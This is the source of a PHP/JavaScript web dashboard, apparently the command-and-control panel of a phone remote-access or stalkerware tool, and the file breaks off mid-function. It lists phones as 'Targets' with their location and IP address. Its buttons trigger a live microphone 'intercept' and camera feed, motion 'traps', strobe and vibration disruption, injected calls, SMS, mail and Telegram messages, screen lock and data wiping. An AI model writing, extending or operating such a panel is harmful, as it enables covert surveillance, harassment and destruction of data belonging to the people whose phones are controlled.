<?php
declare(strict_types=1);
require_once __DIR__ . '/auth_middleware.php';
require_once __DIR__ . '/developersTable.php';

require_auth();
$csrf = csrf_token();

function is_online(?string $lastSeen): bool {
    if (!$lastSeen) return false;
    return (time() - strtotime($lastSeen)) < 300;
}

function esc(string $s): string {
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="<?= esc($csrf) ?>">
    <title>STRATOSPHERE // TACTICAL OPS</title>
    <link rel="icon" type="image/x-icon" href="../images/space.ico">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Outfit:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        :root {
            --bg:       #0a0e14;
            --surface:  #111820;
            --surface2: #161d27;
            --header:   #0d1117;
            --accent:   #00d4aa;
            --accent2:  #00b4d8;
            --danger:   #ff4757;
            --warn:     #ffa502;
            --text:     #c9d1d9;
            --muted:    #4a5568;
            --border:   #1e2a3a;
            --glow:     rgba(0, 212, 170, 0.15);
            --radius:   8px;
        }

        body {
            font-family: 'Outfit', system-ui, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            overflow-x: hidden;
        }

        body::after {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,212,170,0.008) 2px, rgba(0,212,170,0.008) 4px);
            pointer-events: none;
            z-index: 99999;
        }

        .header {
            background: var(--header);
            border-bottom: 1px solid var(--border);
            padding: 0 24px;
            height: 56px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
            backdrop-filter: blur(12px);
        }
        .logo {
            font-family: 'JetBrains Mono', monospace;
            font-size: 15px;
            font-weight: 700;
            letter-spacing: 3px;
            color: var(--accent);
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .logo-icon {
            width: 32px; height: 32px;
            border: 2px solid var(--accent);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            animation: pulse-glow 3s ease-in-out infinite;
        }
        @keyframes pulse-glow {
            0%,100% { box-shadow: 0 0 8px rgba(0,212,170,0.3); }
            50% { box-shadow: 0 0 20px rgba(0,212,170,0.6); }
        }
        .header-meta {
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            color: var(--muted);
            display: flex;
            gap: 20px;
            align-items: center;
        }
        .header-meta .uptime { color: var(--accent); }
        .nav { display: flex; gap: 4px; align-items: center; }
        .nav a {
            font-family: 'JetBrains Mono', monospace;
            color: var(--muted);
            text-decoration: none;
            padding: 6px 14px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 1px;
            text-transform: uppercase;
            transition: all .2s;
            border: 1px solid transparent;
        }
        .nav a:hover { color: var(--accent); border-color: var(--border); background: var(--surface); }
        .nav a.active { color: var(--accent); border-color: var(--accent); background: var(--glow); }
        .nav a.logout { color: var(--danger); }
        .nav a.logout:hover { border-color: var(--danger); background: rgba(255,71,87,0.1); }

        .container { max-width: 1700px; margin: 0 auto; padding: 16px; }

        .grid-top {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr 1fr;
            gap: 12px;
            margin-bottom: 16px;
        }

        .grid-main {
            display: grid;
            grid-template-columns: 1.4fr 1fr;
            gap: 16px;
            margin-bottom: 16px;
        }

        @media (max-width: 1200px) {
            .grid-top { grid-template-columns: 1fr 1fr; }
            .grid-main { grid-template-columns: 1fr; }
        }

        .stat-card {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 16px 20px;
            display: flex;
            align-items: center;
            gap: 16px;
            transition: all 0.2s;
        }
        .stat-card:hover { border-color: var(--accent); box-shadow: 0 0 20px var(--glow); }
        .stat-icon {
            width: 44px; height: 44px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            flex-shrink: 0;
        }
        .stat-icon.green { background: rgba(0,212,170,0.12); color: var(--accent); }
        .stat-icon.blue { background: rgba(0,180,216,0.12); color: var(--accent2); }
        .stat-icon.red { background: rgba(255,71,87,0.12); color: var(--danger); }
        .stat-icon.orange { background: rgba(255,165,2,0.12); color: var(--warn); }
        .stat-label { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
        .stat-value { font-family: 'JetBrains Mono', monospace; font-size: 24px; font-weight: 700; color: #fff; margin-top: 2px; }

        .panel {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            overflow: hidden;
        }
        .panel-header {
            padding: 14px 20px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--surface2);
        }
        .panel-title {
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            font-weight: 700;
            letter-spacing: 2px;
            text-transform: uppercase;
            color: var(--accent);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .panel-title::before {
            content: '';
            width: 3px;
            height: 14px;
            background: var(--accent);
            border-radius: 2px;
        }
        .panel-badge {
            font-family: 'JetBrains Mono', monospace;
            font-size: 10px;
            padding: 3px 10px;
            border-radius: 20px;
            background: var(--glow);
            color: var(--accent);
            border: 1px solid rgba(0,212,170,0.2);
        }
        .panel-body { padding: 16px 20px; }

        .device-table-wrap { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th {
            font-family: 'JetBrains Mono', monospace;
            background: var(--bg);
            color: var(--muted);
            padding: 10px 12px;
            text-align: left;
            font-weight: 600;
            font-size: 10px;
            letter-spacing: 1px;
            text-transform: uppercase;
            border-bottom: 1px solid var(--border);
        }
        td {
            padding: 10px 12px;
            text-align: left;
            border-bottom: 1px solid rgba(30,42,58,0.5);
            font-size: 13px;
        }
        tbody tr { transition: all 0.15s; }
        tbody tr:hover { background: var(--surface2); }
        tbody tr.selected { background: rgba(0,212,170,0.06); border-left: 2px solid var(--accent); }

        .devCb {
            appearance: none;
            width: 16px; height: 16px;
            border: 2px solid var(--muted);
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.15s;
            position: relative;
        }
        .devCb:checked {
            background: var(--accent);
            border-color: var(--accent);
        }
        .devCb:checked::after {
            content: '✓';
            position: absolute;
            top: -1px; left: 2px;
            color: var(--bg);
            font-size: 11px;
            font-weight: 700;
        }

        .badge-online {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            font-size: 11px;
            color: var(--accent);
            font-weight: 600;
        }
        .badge-online::before {
            content: '';
            width: 7px; height: 7px;
            border-radius: 50%;
            background: var(--accent);
            box-shadow: 0 0 8px var(--accent);
            animation: pulse-dot 2s infinite;
        }
        .badge-offline {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            font-size: 11px;
            color: var(--muted);
        }
        .badge-offline::before {
            content: '';
            width: 7px; height: 7px;
            border-radius: 50%;
            background: var(--muted);
        }

        .battery-bar {
            width: 40px; height: 6px;
            background: var(--bg);
            border-radius: 3px;
            overflow: hidden;
            display: inline-block;
            vertical-align: middle;
            margin-right: 6px;
        }
        .battery-fill { height: 100%; border-radius: 3px; transition: width 0.3s; }

        .cmd-section { margin-bottom: 14px; }
        .cmd-section-title {
            font-family: 'JetBrains Mono', monospace;
            font-size: 9px;
            letter-spacing: 2px;
            text-transform: uppercase;
            color: var(--muted);
            margin-bottom: 8px;
            padding-bottom: 4px;
            border-bottom: 1px solid var(--border);
        }
        .commands-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
            gap: 6px;
        }
        .cmd-btn {
            font-family: 'JetBrains Mono', monospace;
            padding: 10px 8px;
            font-size: 10px;
            font-weight: 600;
            color: var(--text);
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: 6px;
            cursor: pointer;
            transition: all .15s;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        .cmd-btn:hover { border-color: var(--accent); color: var(--accent); background: var(--glow); transform: translateY(-1px); }
        .cmd-btn.active {
            background: rgba(0,212,170,0.15);
            border-color: var(--accent);
            color: var(--accent);
            box-shadow: 0 0 16px var(--glow), inset 0 0 20px var(--glow);
        }
        .cmd-btn.danger { border-color: rgba(255,71,87,0.4); }
        .cmd-btn.danger:hover { border-color: var(--danger); color: var(--danger); background: rgba(255,71,87,0.1); }

        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }
        .info-block {
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 12px;
        }
        .info-label {
            font-family: 'JetBrains Mono', monospace;
            font-size: 9px;
            color: var(--muted);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .info-value {
            font-family: 'JetBrains Mono', monospace;
            font-size: 16px;
            font-weight: 700;
            color: var(--accent);
            margin-top: 4px;
            word-break: break-all;
        }
        .cmd-history { max-height: 200px; overflow-y: auto; margin-top: 10px; }
        .cmd-history-item {
            font-family: 'JetBrains Mono', monospace;
            font-size: 10px;
            padding: 6px 10px;
            border-left: 2px solid var(--accent);
            margin-bottom: 4px;
            background: var(--bg);
            border-radius: 0 4px 4px 0;
            color: var(--text);
            display: flex;
            justify-content: space-between;
        }
        .cmd-history-item .cmd-time { color: var(--muted); }

        #map {
            height: 420px;
            border-radius: 0 0 var(--radius) var(--radius);
            filter: saturate(0.3) brightness(0.85) contrast(1.1);
        }
        #map:hover { filter: saturate(0.6) brightness(0.9) contrast(1.05); transition: filter 0.5s; }

        @keyframes radar-pulse {
            0% {       stroke-width: 2; fill-opacity: 0.2;  r: 10px;  }
            50% {      stroke-width: 1.5; fill-opacity: 0.08; }
            100% {     stroke-width: 0.5; fill-opacity: 0;   r: 120px; opacity: 0; }
        }
        .radar-pulse-circle {
            animation: radar-pulse 2s cubic-bezier(0.215, 0.610, 0.355, 1) infinite;
            stroke: var(--accent);
            fill: var(--accent);
            transform-origin: center;
        }

        .toast-container {
            position: fixed;
            top: 70px;
            right: 20px;
            z-index: 9998;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .toast {
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            padding: 10px 16px;
            border-radius: 6px;
            color: #fff;
            background: var(--surface);
            border: 1px solid var(--border);
            box-shadow: 0 8px 30px rgba(0,0,0,0.4);
            animation: toast-in 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .toast.success { border-color: var(--accent); }
        .toast.error { border-color: var(--danger); }

        #floatingMatrixWindow {
            position: fixed;
            bottom: 12px;
            right: 12px;
            width: 1200px;
            height: 640px;
            max-width: 95vw;
            max-height: 92vh;
            background: var(--bg);
            border: 2px solid var(--accent);
            border-radius: var(--radius);
            box-shadow: 0 0 40px rgba(0,212,170,0.15), 0 20px 60px rgba(0,0,0,0.5);
            z-index: 9999;
            display: none;
            flex-direction: column;
            overflow: hidden;
            transition: height 0.25s ease;
        }
        #matrixHeader {
            background: var(--header);
            padding: 10px 16px;
            color: var(--accent);
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            font-weight: 700;
            letter-spacing: 2px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: move;
            border-bottom: 1px solid var(--border);
            user-select: none;
        }
        .matrix-actions button {
            background: none;
            border: 1px solid var(--border);
            color: var(--muted);
            font-size: 13px;
            cursor: pointer;
            margin-left: 8px;
            padding: 2px 10px;
            border-radius: 4px;
            transition: all 0.15s;
        }
        .matrix-actions button:hover { color: #fff; border-color: #fff; }
        #matrixGrid { display:block; width:100%; height:100%; background:var(--bg); overflow:hidden; }
        .single-iframe-box { width:100%; height:100%; position:relative; }
        .single-iframe-box iframe { width:100%; height:100%; border:none; background:#000; display:block; }

        #tacticalModal {
            position: fixed;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 450px; max-width: 90vw;
            background: var(--surface);
            border: 1px solid var(--accent);
            box-shadow: 0 0 30px rgba(0,212,170,0.2), 0 20px 50px rgba(0,0,0,0.6);
            border-radius: var(--radius);
            z-index: 10005;
            display: none;
            flex-direction: column;
            overflow: hidden;
        }
        .modal-header {
            background: var(--surface2);
            padding: 12px 16px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            font-weight: 700;
            color: var(--accent);
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .modal-body { padding: 16px; color: var(--text); }
        .modal-input {
            width: 100%;
            background: var(--bg);
            border: 1px solid var(--border);
            color: #fff;
            font-family: 'JetBrains Mono', monospace;
            padding: 10px;
            border-radius: 6px;
            font-size: 12px;
            outline: none;
            margin-top: 6px;
            margin-bottom: 12px;
        }
        .modal-input:focus { border-color: var(--accent); }
        .modal-btn-row { display: flex; gap: 8px; justify-content: flex-end; }
        #modalOverlay {
            position: fixed; top:0; left:0; right:0; bottom:0;
            background: rgba(5,7,10,0.8); backdrop-filter: blur(4px);
            z-index: 10000; display: none;
        }

        .audio-visualizer-container {
            display: flex;
            align-items: flex-end;
            justify-content: center;
            gap: 4px;
            height: 60px;
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 10px;
            margin-bottom: 14px;
        }
        .v-bar {
            width: 6px; height: 5px;
            background: var(--accent);
            border-radius: 3px 3px 0 0;
        }
        .visualizing .v-bar {
            animation: bounce-bar 0.6s ease-in-out infinite alternate;
        }
        @keyframes bounce-bar {
            from { height: 4px; }
            to { height: 45px; background: var(--accent2); }
        }

        .color-swatches { display: flex; gap: 10px; align-items: center; margin-bottom: 12px; }
        .swatch {
            width: 30px; height: 30px; border-radius: 5px; cursor: pointer; border: 2px solid var(--border);
        }
        .swatch:hover { border-color: #fff; }
        .swatch.white { background: #ffffff; }
        .swatch.red { background: #ff4757; }
        .picker-wrapper { display: flex; align-items: center; gap: 8px; font-family:'JetBrains Mono', monospace; font-size:11px; }
        .custom-color-picker { background: none; border: none; width:34px; height:34px; cursor:pointer; }
    </style>
</head>
<body>

<div class="header">
    <div class="logo">
        <div class="logo-icon">◉</div>
        STRATOSPHERE
    </div>
    <div class="header-meta">
        <span class="clock" id="headerClock">--:--:--</span>
        <span>|</span>
        <span class="uptime" id="onlineCount">0</span><span> ONLINE</span>
    </div>
    <nav class="nav">
        <a href="index.php" class="active">OPS</a>
        <a href="Localisation.php">GEO</a>
        <a href="logout.php" class="logout">EXIT</a>
    </nav>
</div>

<div class="toast-container" id="toastContainer"></div>

<div id="modalOverlay"></div>
<div id="tacticalModal">
    <div class="modal-header">
        <span id="tacticalModalTitle">COMMAND ARGS SETUP</span>
        <span style="cursor:pointer;color:var(--muted);" id="closeTacticalModal">✕</span>
    </div>
    <div class="modal-body" id="tacticalModalBody"></div>
</div>

<div class="container">

    <div class="grid-top">
        <div class="stat-card">
            <div class="stat-icon green">📡</div>
            <div><div class="stat-label">Devices Online</div><div class="stat-value" id="statOnline">0</div></div>
        </div>
        <div class="stat-card">
            <div class="stat-icon blue">📱</div>
            <div><div class="stat-label">Total Fleet</div><div class="stat-value" id="statTotal">0</div></div>
        </div>
        <div class="stat-card">
            <div class="stat-icon orange">⚡</div>
            <div><div class="stat-label">Selected</div><div class="stat-value" id="selCount">0</div></div>
        </div>
        <div class="stat-card">
            <div class="stat-icon red">🎯</div>
            <div><div class="stat-label">Last Command</div><div class="stat-value" id="lastCmd" style="font-size:13px">—</div></div>
        </div>
    </div>

    <div class="grid-main">
        
        <div style="display:flex;flex-direction:column;gap:16px;">

            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title">Fleet Roster</div>
                    <div style="display:flex;gap:8px;align-items:center;">
                        <span id="refreshBadge" style="display:none" class="refresh-badge">⟳</span>
                        <span class="panel-badge" id="selIds">NONE SELECTED</span>
                    </div>
                </div>
                <div class="panel-body" style="padding:0;">
                    <div class="device-table-wrap">
                        <table id="devicesTable">
                            <thead>
                                <tr>
                                    <th style="width:36px"><input type="checkbox" id="selectAll" class="devCb" title="Select all"></th>
                                    <th>ID</th>
                                    <th>Brand</th>
                                    <th>Model</th>
                                    <th>OS</th>
                                    <th>Net</th>
                                    <th>Battery</th>
                                    <th>Status</th>
                                </tr>
                            </thead>
                            <tbody id="devicesBody">
                            <?php 
                            $devicesCache = [];
                            if (is_array($fetchData)): 
                            ?>
                                <?php foreach ($fetchData as $d): 
                                    $dId = (int)$d['Id'];
                                    $dBrand = $d['BrandName'] ?? 'Inconnu';
                                    $dModel = $d['ModelName'] ?? 'Appareil';
                                    $devicesCache[$dId] = ['brand' => $dBrand, 'model' => $dModel];
                                    $online = is_online($d['LastSeen'] ?? null);
                                    $bat = (int)($d['BatteryLevel'] ?? 0);
                                    $batColor = $bat > 50 ? 'var(--accent)' : ($bat > 20 ? 'var(--warn)' : 'var(--danger)');
                                ?>
                                <tr data-id="<?= $dId ?>"
                                    data-lat="<?= (float)($d['Latitude'] ?? 0) ?>"
                                    data-lon="<?= (float)($d['Longitude'] ?? 0) ?>"
                                    data-brand="<?= esc($dBrand) ?>"
                                    data-model="<?= esc($dModel) ?>"
                                    data-battery="<?= $bat ?>"
                                    data-ip="<?= esc($d['ip_address'] ?? '0.0.0.0') ?>"
                                    data-os="<?= esc($d['ModelOs'] ?? '') ?>">
                                    <td><input type="checkbox" class="devCb" value="<?= $dId ?>"></td>
                                    <td style="font-family:'JetBrains Mono',monospace;color:var(--accent2);font-weight:700;">#<?= $dId ?></td>
                                    <td><?= esc($dBrand) ?></td>
                                    <td style="font-weight:600;"><?= esc($dModel) ?></td>
                                    <td style="color:var(--muted);font-size:11px;"><?= esc($d['ModelOs'] ?? '') ?></td>
                                    <td><span style="font-size:11px;"><?= esc($d['ConnectType'] ?? '') ?></span></td>
                                    <td>
                                        <div class="battery-bar"><div class="battery-fill" style="width:<?= $bat ?>%;background:<?= $batColor ?>"></div></div>
                                        <span style="font-family:'JetBrains Mono',monospace;font-size:11px;"><?= $bat ?>%</span>
                                    </td>
                                    <td><span class="<?= $online ? 'badge-online' : 'badge-offline' ?>"><?= $online ? 'LIVE' : 'OFF' ?></span></td>
                                </tr>
                                <?php endforeach; ?>
                            <?php else: ?>
                                <tr><td colspan="8" style="color:var(--muted);padding:24px;text-align:center;">No devices connected</td></tr>
                            <?php endif; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
            
            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title">Geo Intel</div>
                    <span class="panel-badge">SATELLITE</span>
                </div>
                <div id="map"></div>
            </div>
        </div>

        <div style="display:flex;flex-direction:column;gap:16px;">

            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title">Command Center</div>
                </div>
                <div class="panel-body">

                    <div class="cmd-section">
                        <div class="cmd-section-title">⚡ Hardware Triggers</div>
                        <div class="commands-grid">
                            <button id="btnFlash" class="cmd-btn" data-on="FLASH" data-off="NOFLASH" data-toggle="1">💡 Flash</button>
                            <button id="btnStrobo" class="cmd-btn" data-on="STROBO" data-off="NOSTROBO" data-toggle="1">⚡ Strobo</button>
                            <button id="btnVibrate" class="cmd-btn" data-on="VIBRATE" data-off="STOPVIBRATE" data-toggle="1">📳 Vibrate</button>
                            <button id="btnRing" class="cmd-btn" data-on="RING" data-off="STOPRING" data-toggle="1">🔔 Ring</button>
                        </div>
                    </div>

                    <div class="cmd-section">
                        <div class="cmd-section-title">📡 Surveillance Feeds</div>
                        <div class="commands-grid">
                            <button id="btnMicro" class="cmd-btn" data-on="MICRO" data-off="STOPMICRO" data-toggle="1">🎙 Mic</button>
                            <button id="btnLive" class="cmd-btn" data-on="LIVE" data-off="STOPLIVE" data-toggle="1">🔴 LIVE</button>
                        </div>
                    </div>

                    <div class="cmd-section">
                        <div class="cmd-section-title">🚨 Active Traps & Hardware Disruption</div>
                        <div class="commands-grid">
                            <button id="btnMotionTrap" class="cmd-btn" data-on="MOTION_TRAP_ON" data-off="MOTION_TRAP_OFF" data-toggle="1">🚷 Motion Trap</button>
                            <button id="btnProxTrigger" class="cmd-btn" data-on="PROXIMITY_ON" data-off="PROXIMITY_OFF" data-toggle="1">🕶️ Proximity</button>
                            <button id="btnWifiScan" class="cmd-btn">📶 WiFi Scan</button>
                            <button id="btnStroboCombo" class="cmd-btn danger" data-on="STROBO_COMBO_ON" data-off="STROBO_COMBO_OFF" data-toggle="1">🚨 Full Strobo</button>
                        </div>
                    </div>

                    <div class="cmd-section">
                        <div class="cmd-section-title">🌓 Luminescent Ops & Output Matrix</div>
                        <div class="commands-grid">
                            <button id="btnFullGlow" class="cmd-btn">🖥️ Full Glow</button>
                            <button id="btnTTS" class="cmd-btn">🔊 TTS Box</button>
                            <button id="btnMorse" class="cmd-btn">·−·− Morse</button>
                            <button id="btnAudio" class="cmd-btn">🎵 Audio Deck</button>
                        </div>
                    </div>

                    <div class="cmd-section">
                        <div class="cmd-section-title">💬 Comms Overlord (Inject Call/Text/Wire)</div>
                        <div class="commands-grid">
                            <button id="btnCommCall" class="cmd-btn">📞 Dial Call</button>
                            <button id="btnCommSMS" class="cmd-btn">💬 Send SMS</button>
                            <button id="btnCommMail" class="cmd-btn">✉️ Send Mail</button>
                            <button id="btnCommTelegram" class="cmd-btn" style="color:var(--accent2);border-color:rgba(0,180,216,0.3)">✈️ Telegram</button>
                        </div>
                    </div>

                    <div class="cmd-section">
                        <div class="cmd-section-title">🛠 Utilities & Remote Security</div>
                        <div class="commands-grid">
                            <button id="btnLocalise" class="cmd-btn">📍 Locate</button>
                            <button id="btnScreenLock" class="cmd-btn">🔒 Screen Lock</button>
                            <button id="btnWipeData" class="cmd-btn danger">🚨 Wipe Assets</button>
                        </div>
                    </div>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title">Mission Intel</div>
                </div>
                <div class="panel-body">
                    <div class="info-grid">
                        <div class="info-block">
                            <div class="info-label">Targets</div>
                            <div class="info-value" id="selIdsValue">—</div>
                        </div>
                        <div class="info-block">
                            <div class="info-label">Count</div>
                            <div class="info-value" id="selCountValue">0</div>
                        </div>
                    </div>
                    <div style="margin-top:14px;">
                        <div class="info-label" style="margin-bottom:8px;">Command History</div>
                        <div class="cmd-history" id="cmdHistory"></div>
                    </div>
                </div>
            </div>

        </div>
    </div>

</div>

<div id="floatingMatrixWindow">
    <div id="matrixHeader">
        <span>◉ STRATOSPHERE // MATRIX FEED</span>
        <div class="matrix-actions">
            <button onclick="minimizeMatrixWindow()" title="Minimize">_</button>
            <button onclick="closeMatrixWindow()" title="Close" style="color:var(--danger)">✕</button>
        </div>
    </div>
    <div id="matrixGrid"></div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
'use strict';

const CSRF = document.querySelector('meta[name="csrf-token"]').content;
window.globalDevicesMap = <?= json_encode($devicesCache) ?> || {};

function updateClock() {
    const now = new Date();
    document.getElementById('headerClock').textContent = now.toLocaleTimeString('fr-FR', {hour:'2-digit',minute:'2-digit',second:'2-digit'});
}
setInterval(updateClock, 1000);
updateClock();

function updateStats() {
    const all = document.querySelectorAll('#devicesBody tr[data-id]');
    const online = document.querySelectorAll('.badge-online').length;
    document.getElementById('statOnline').textContent = online;
    document.getElementById('statTotal').textContent = all.length;
    document.getElementById('onlineCount').textContent = online;
}
updateStats();

function showToast(msg, type = 'success') {
    const c = document.getElementById('toastContainer');
    const t = document.createElement('div');
    t.className = `toast ${type}`;
    t.innerHTML = `<span>${type === 'success' ? '✓' : '✕'}</span> ${msg}`;
    c.appendChild(t);
    setTimeout(() => { t.style.opacity = '0'; setTimeout(() => t.remove(), 300); }, 3000);
}

const map = L.map('map', { zoomControl: false }).setView([20, 0], 2);
L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
    maxZoom: 19,
    attribution: ''
}).addTo(map);
L.control.zoom({ position: 'topright' }).addTo(map);

const iconOnline = L.divIcon({ className: '', html: '<div style="width:12px;height:12px;background:#00d4aa;border-radius:50%;box-shadow:0 0 10px #00d4aa;border:2px solid #0a0e14;"></div>', iconSize:[16,16], iconAnchor:[8,8] });
const iconSelected = L.divIcon({ className: '', html: '<div style="width:14px;height:14px;background:#ff4757;border-radius:50%;box-shadow:0 0 12px #ff4757;border:2px solid #0a0e14;"></div>', iconSize:[18,18], iconAnchor:[9,9] });

const markers = {};
let activeRadarCircle = null;

function addMarker(row) {
    const { id, lat, lon, brand, model, battery, os } = row;
    if (!lat || !lon) return;
    const m = L.marker([lat, lon], { icon: iconOnline }).addTo(map);
    m.bindPopup(`<div style="font-family:'JetBrains Mono',monospace;font-size:11px;"><b style="color:#00d4aa">#${id}</b><br>${brand} ${model}<br>OS: ${os}<br>Battery: ${battery}%</div>`);
    markers[id] = m;
}

document.querySelectorAll('#devicesBody tr[data-id]').forEach(tr => {
    const lat = parseFloat(tr.dataset.lat);
    const lon = parseFloat(tr.dataset.lon);
    if (lat && lon) {
        addMarker({ id: tr.dataset.id, lat, lon, brand: tr.dataset.brand, model: tr.dataset.model, battery: tr.dataset.battery, os: tr.dataset.os });
    }
});

let selectedIds = new Set();

function updateSelection() {
    selectedIds = new Set([...document.querySelectorAll('.devCb:checked:not(#selectAll)')].map(cb => cb.value));
    const list = [...selectedIds];
    document.getElementById('selIds').textContent = list.length ? list.map(i=>'#'+i).join(' ') : 'NONE SELECTED';
    document.getElementById('selIdsValue').textContent = list.length ? list.join(', ') : '—';
    document.getElementById('selCount').textContent = list.length;
    document.getElementById('selCountValue').textContent = list.length;

    document.querySelectorAll('#devicesBody tr[data-id]').forEach(tr => {
        tr.classList.toggle('selected', selectedIds.has(tr.dataset.id));
    });
}

document.getElementById('selectAll').addEventListener('change', function() {
    document.querySelectorAll('.devCb:not(#selectAll)').forEach(cb => {
        cb.checked = this.checked;
        if (markers[cb.value]) markers[cb.value].setIcon(this.checked ? iconSelected : iconOnline);
    });
    updateSelection();
});

document.querySelectorAll('.devCb:not(#selectAll)').forEach(cb => {
    cb.addEventListener('change', () => {
        if (markers[cb.value]) markers[cb.value].setIcon(cb.checked ? iconSelected : iconOnline);
        updateSelection();
        document.getElementById('selectAll').checked = document.querySelectorAll('.devCb:not(#selectAll):not(:checked)').length === 0;
    });
});

const tModal = document.getElementById('tacticalModal');
const mOverlay = document.getElementById('modalOverlay');
const mBody = document.getElementById('tacticalModalBody');
const mTitle = document.getElementById('tacticalModalTitle');

function openTacticalModal(title, htmlContent) {
    mTitle.textContent = title;
    mBody.innerHTML = htmlContent;
    mOverlay.style.display = 'block';
    tModal.style.display = 'flex';
}

function closeTacticalModal() {
    mOverlay.style.display = 'none';
    tModal.style.display = 'none';
    mBody.innerHTML = '';
}
document.getElementById('closeTacticalModal').onclick = closeTacticalModal;
mOverlay.onclick = closeTacticalModal;

const activeToggles = {};

// INTERFACE DE TRANSMISSION BRUTE UNIFIÉE
async function sendCommand(command, payload = null) {
    if (selectedIds.size === 0) {
        showToast('No device selected', 'error');
        return false;
    }

    // Reconstruction de la chaîne brute finale attendue par la table
    let finalCommandPayload = command;
    if (payload !== null) {
        finalCommandPayload = command + ":" + payload;
    }

    const results = await Promise.all([...selectedIds].map(async id => {
        // CORRECTION MAJEURE : On injecte la chaîne complète argumentée dans le champ unique "command"
        const bodyParams = { id, command: finalCommandPayload, csrf_token: CSRF };
        const body = new URLSearchParams(bodyParams);
        try {
            const res = await fetch('update_command.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-CSRF-Token': CSRF },
                body: body.toString()
            });
            return res.ok;
        } catch { return false; }
    }));

    const ok = results.every(Boolean);
    const ts = new Date().toLocaleTimeString('fr-FR');
    document.getElementById('lastCmd').textContent = command;
    showToast(`${command} → ${[...selectedIds].map(i=>'#'+i).join(', ')}`, ok ? 'success' : 'error');

    const hist = document.getElementById('cmdHistory');
    const item = document.createElement('div');
    item.className = 'cmd-history-item';
    item.innerHTML = `<span>${finalCommandPayload} → ${[...selectedIds].map(i=>'#'+i).join(', ')}</span><span class="cmd-time">${ts}</span>`;
    hist.prepend(item);
    return ok;
}

// 1. Mic Custom Visualizer Stream
document.getElementById('btnMicro').addEventListener('click', function() {
    if(activeToggles['btnMicro']) { closeTacticalModal(); return; }
    if (selectedIds.size === 0) return;
    let html = `
        <div class="audio-visualizer-container visualizing">
            <div class="v-bar" style="animation-delay: 0.1s"></div>
            <div class="v-bar" style="animation-delay: 0.4s"></div>
            <div class="v-bar" style="animation-delay: 0.2s"></div>
            <div class="v-bar" style="animation-delay: 0.6s"></div>
            <div class="v-bar" style="animation-delay: 0.3s"></div>
        </div>
        <p style="font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);text-align:center;margin-bottom:12px;">STREAMING AUDIO EN DIRECT...</p>
        <div class="modal-btn-row"><button class="cmd-btn danger" id="modalCloseMic">STOP FEED</button></div>`;
    openTacticalModal("🎙️ LIVE MICROPHONE INTERCEPT", html);
    document.getElementById('modalCloseMic').onclick = () => { document.getElementById('btnMicro').click(); closeTacticalModal(); };
});

// 2. Locate Pulse Trigger
document.getElementById('btnLocalise').addEventListener('click', async () => {
    if (selectedIds.size === 0) return;
    const ok = await sendCommand('LOCALISATION');
    if (!ok) return;
    const firstId = [...selectedIds][0];
    const row = document.querySelector(`#devicesBody tr[data-id="${firstId}"]`);
    if (row) {
        const lat = parseFloat(row.dataset.lat);
        const lon = parseFloat(row.dataset.lon);
        if (lat && lon) {
            map.setView([lat, lon], 16);
